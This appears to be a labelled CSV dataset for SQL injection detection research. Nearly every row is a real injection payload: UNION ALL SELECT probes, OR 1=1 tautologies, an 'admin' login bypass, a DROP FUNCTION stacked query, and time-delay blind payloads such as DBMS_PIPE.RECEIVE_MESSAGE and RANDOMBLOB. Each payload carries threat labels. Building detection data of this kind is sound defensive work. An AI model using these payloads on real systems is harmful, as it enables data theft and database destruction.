10088,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4907  =  9581  )   select 4907 else drop function apqw--,IF ( 4907 = 9581 ) SELECT 4907 ELSE DROP FUNCTION APQW--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
7727,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%""   )    )     )   union all select null,null,null,null--","1%"" ) ) ) UNION ALL SELECT NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1538,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-1036'  )   or 6872  =  6872 and   (  'wvbi'  =  'wvbi,-1036' ) OR 6872 = 6872 AND ( 'WVBI' = 'WVBI,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
10220,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' in boolean mode  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #","1' IN BOOLEAN MODE ) OR CHAR ( 117 ) ||CHAR ( 111 ) ||CHAR ( 105 ) ||CHAR ( 100 ) = REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
11,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,? or 1  =  1 --,? OR 1 = 1 --,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_based_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
34234,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"On 21 June , conjunction Schwarzwaldverein &#91; Black Forest Association &#93; Mid-Summer Festival , 12 July Arena , accompanied fireworks , 13 December first concert put Stadtmusik (Town Musical Society) new Festival Hall","ON 21 JUNE , CONJUNCTION SCHWARZWALDVEREIN &#91; BLACK FOREST ASSOCIATION &#93; MID-SUMMER FESTIVAL , 12 JULY ARENA , ACCOMPANIED FIREWORKS , 13 DECEMBER FIRST CONCERT PUT STADTMUSIK (TOWN MUSICAL SOCIETY) NEW FESTIVAL HALL",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,stacked_fragment,policy,False,False,True,True,False,False,False,True,True,False,,3
19290,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,admin' or ',ADMIN' OR ',injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,authentication_bypass_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4240,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-1573""  )   union all select 3928,3928,3928,3928--","-1573"" ) UNION ALL SELECT 3928,3928,3928,3928--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1917,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-5661'   )    )    union all select 3011,3011#","-5661' ) ) UNION ALL SELECT 3011,3011#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
7209,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm","1' AND ELT ( 3247 = 3969,3969 ) AND 'XCBM' LIKE 'XCBM",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
615,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,x' or 1  =  1 or 'x'  =  'y,X' OR 1 = 1 OR 'X' = 'Y,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_based_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
5488,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--","-7296%' ) ) ) UNION ALL SELECT 9322,9322,9322,9322--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
719,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"admin""  )   or ""1""  =  ""1""--","ADMIN"" ) OR ""1"" = ""1""--",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
10253,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )","1' AND 6537 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 76 ) ||CHR ( 116 ) ||CHR ( 117 ) ||CHR ( 65 ) ,5 )",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
7562,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' where 4150  =  4150 and elt  (  8012  =  6026,6026  )  --","1' WHERE 4150 = 4150 AND ELT ( 8012 = 6026,6026 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
5765,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""   )    )     )   union all select null,null,null,null--","1"" ) ) ) UNION ALL SELECT NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
4437,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7548 or 2850  =  9666,-7548 OR 2850 = 9666,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4938,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )    union all select null,null,null,null,null,null,null#","1 ) ) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
2555,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   3127  =  3127","CALL REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) AND ( ( 3127 = 3127",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
2935,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7971' union all select 4273#,-7971' UNION ALL SELECT 4273#,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3949,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--","-3862' ) ) UNION ALL SELECT 2495,2495,2495,2495,2495,2495,2495--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3691,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )    and elt  (  9288  =  6067,6067  )   and    (    (   1895  =  1895","1 ) ) AND ELT ( 9288 = 6067,6067 ) AND ( ( 1895 = 1895",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
5325,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  5621  =  5621","1 ) OR CHAR ( 68 ) ||CHAR ( 69 ) ||CHAR ( 97 ) ||CHAR ( 85 ) = REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 5389 ) ,0 ) ,5000000000 ) ,NULL ) AND ( 5621 = 5621",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
941,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7999  )   or 8422  =  1336,-7999 ) OR 8422 = 1336,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4078,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --","1' AND CHAR ( 109 ) ||CHAR ( 79 ) ||CHAR ( 70 ) ||CHAR ( 90 ) = REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 5012 ) ,0 ) ,5000000000 ) ,NULL ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
940,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929","1 ) AND CHAR ( 111 ) ||CHAR ( 77 ) ||CHAR ( 121 ) ||CHAR ( 88 ) = REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) AND ( 8929 = 8929",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4502,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   as pcnd where 4589  =  4589 union all select null,null,null,null,null,null,null,null,null,null--","1 ) AS PCND WHERE 4589 = 4589 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3431,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   where 1363  =  1363 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --","1' ) WHERE 1363 = 1363 OR CHAR ( 68 ) ||CHAR ( 69 ) ||CHAR ( 97 ) ||CHAR ( 85 ) = REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 5389 ) ,0 ) ,5000000000 ) ,NULL ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
2912,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1   )    )    and 2006  =  2006,1 ) ) AND 2006 = 2006,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
3884,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#","1 ) WHERE 2678 = 2678 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3773,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   as ybuv where 9641  =  9641 union all select null,null,null,null,null,null,null,null--","1' ) AS YBUV WHERE 9641 = 9641 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
10210,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#","-1526"" ) WHERE 4870 = 4870 UNION ALL SELECT 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
6272,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-1366' or make_set  (  9354  =  9354,7185  )   and 'abre'  =  'abre","-1366' OR MAKE_SET ( 9354 = 9354,7185 ) AND 'ABRE' = 'ABRE",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
6530,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-9227  )   where 6723  =  6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--","-9227 ) WHERE 6723 = 6723 UNION ALL SELECT 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1503,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1' ) ) ) AND 8148 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2 ) ) ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
8503,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#","-6770' ) ) UNION ALL SELECT 1845,1845,1845,1845,1845,1845,1845,1845,1845#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
11172,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--","-4550"" ) AS HLWE WHERE 6026 = 6026 OR ( 9364 = 9593 ) *9593--",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
3325,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--","1 WHERE 6408 = 6408 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
7182,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-9062"" or 6872  =  6872 and ""aumq"" like ""aumq","-9062"" OR 6872 = 6872 AND ""AUMQ"" LIKE ""AUMQ",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
3339,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-4355""   )    )     )   or 9323  =  9323#","-4355"" ) ) ) OR 9323 = 9323#",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
5166,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#","-9615 ) AS DNTK WHERE 4780 = 4780 UNION ALL SELECT 4780,4780,4780,4780,4780,4780,4780,4780#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
2001,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--","-6754' ) WHERE 8388 = 8388 UNION ALL SELECT 8388,8388,8388,8388,8388--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1306,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --","1 ) ) ) OR CHAR ( 119 ) ||CHAR ( 100 ) ||CHAR ( 99 ) ||CHAR ( 121 ) = REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 1441 ) ,0 ) ,5000000000 ) ,NULL ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
10516,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   where 8835  =  8835 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1' ) WHERE 8835 = 8835 OR 8384 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2 ) ) ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
8044,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-9672%""   )    )     )   order by 1#","-9672%"" ) ) ) ORDER BY 1#",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
5550,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --","1%' ) ) ) OR 7427 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 116 ) ||CHR ( 87 ) ||CHR ( 90 ) ||CHR ( 109 ) ,5 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
7257,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--","-2305' IN BOOLEAN MODE ) UNION ALL SELECT 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
2540,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--","1"" ) AS SSBZ WHERE 8885 = 8885 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
998,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7562  )   or 8571  =  8571--,-7562 ) OR 8571 = 8571--,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
11134,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1' and   (  3020  =  3020  )  *6703 and 'qsrz'  =  'qsrz,1' AND ( 3020 = 3020 ) *6703 AND 'QSRZ' = 'QSRZ,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
1994,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,-2241 ) WHERE 7606 = 7606 OR ( 8459 = 8459 ) *4906--,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
